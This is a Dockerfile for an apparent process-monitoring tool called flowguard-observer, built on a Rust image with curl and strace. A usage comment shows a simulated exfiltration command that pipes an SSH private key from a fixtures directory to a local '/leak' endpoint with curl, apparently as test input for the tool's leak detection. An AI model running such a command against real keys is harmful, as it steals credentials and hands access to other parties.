FROM rust:1-bookworm

RUN apt-get update \
    && apt-get install -y --no-install-recommends \
        ca-certificates \
        curl \
        procps \
        strace \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /work

# Example:
# docker build -f docker/observer.Dockerfile -t flowguard-observer .
# docker run --rm -v "$PWD:/work" -v "$PWD/fixtures/home:/home/user:ro" -w /work flowguard-observer \
#   cargo run -- observe --json --raw-strace trace.raw.log -- sh -c 'cat /home/user/.ssh/id_rsa | curl -X POST --data-binary @- http://host.docker.internal:8000/leak'
